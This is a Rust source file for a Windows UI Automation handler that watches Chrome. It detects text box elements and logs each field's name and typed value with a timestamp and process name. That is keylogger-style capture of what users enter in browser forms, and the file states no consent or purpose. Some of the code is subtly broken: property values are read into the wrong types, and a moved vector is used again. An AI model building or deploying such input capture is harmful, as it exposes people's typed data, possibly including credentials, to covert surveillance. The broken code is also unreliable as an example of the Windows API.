use std::sync::{Arc, Mutex};
use windows::Win32::UI::Accessibility::{
    IUIAutomationElement,
    UIA_PROPERTY_ID,
    UIA_ValueValuePropertyId,
    UIA_NamePropertyId,
    UIA_LegacyIAccessibleRolePropertyId,
    UIA_AriaRolePropertyId,
};
use windows::core::{BSTR, Interface};
use crate::logger::Logger;
use crate::error::Result;
use super::common::{handle_generic_property_change, get_element_value, get_element_name};

pub fn create_chrome_handler(logger: Arc<Mutex<Logger>>) -> Box<dyn Fn(&IUIAutomationElement, &str, &str, UIA_PROPERTY_ID, BSTR) -> Result<()> + Send + Sync> {
    Box::new(move |element, process_name, date, property_id, new_value| {
        match property_id {
            UIA_ValueValuePropertyId | UIA_NamePropertyId => {
                handle_chrome_property_change(element, process_name, date, property_id, new_value, logger.clone())
            }
            _ => handle_generic_property_change(element, process_name, date, property_id, new_value, &logger),
        }
    })
}

fn handle_chrome_property_change(
    element: &IUIAutomationElement,
    process_name: &str,
    date: &str,
    property_id: UIA_PROPERTY_ID,
    new_value: BSTR,
    logger: Arc<Mutex<Logger>>,
) -> Result<()> {
    // Check if this is a text input field
    let role_value = unsafe {
        let mut role = 0i32;
        element.GetCurrentPropertyValue(UIA_LegacyIAccessibleRolePropertyId, &mut role)?;
        role
    };

    if role_value != 42 {
        return handle_generic_property_change(element, process_name, date, property_id, new_value, &logger);
    }

    let aria_role = unsafe {
        let mut role = Vec::<u16>::new();
        element.GetCurrentPropertyValue(UIA_AriaRolePropertyId, &mut role.into())?;
        String::from_utf16_lossy(&role)
    };

    if aria_role != "textbox" {
        return handle_generic_property_change(element, process_name, date, property_id, new_value, &logger);
    }

    let field_name = get_element_name(element)?;
    let field_value = if new_value.is_null() {
        String::from("<null>")
    } else {
        unsafe { new_value.to_string().unwrap_or_else(|_| String::from("<error>")) }
    };

    let log_message = format!(
        "{} {} [Chrome Input]\nField: {}\nValue: {}\n",
        date, process_name, field_name, field_value
    );

    if let Ok(mut logger) = logger.lock() {
        logger.log(&log_message)?;
    }

    Ok(())
} 